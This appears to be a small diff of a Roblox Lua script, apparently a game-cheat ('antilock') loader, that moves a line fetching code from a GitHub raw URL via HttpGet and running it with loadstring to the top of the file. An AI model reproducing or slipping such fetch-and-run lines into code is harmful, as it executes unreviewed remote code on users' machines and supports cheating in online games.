@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fear0004/script/main/ggantilock"))()
 local RunService = game:GetService("RunService")
 
 RunService.Heartbeat:Connect(function()
@@ -13,4 +14,4 @@ RunService.Heartbeat:Connect(function()
 end)
 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/fear0004/script/main/ggantilock"))()
+
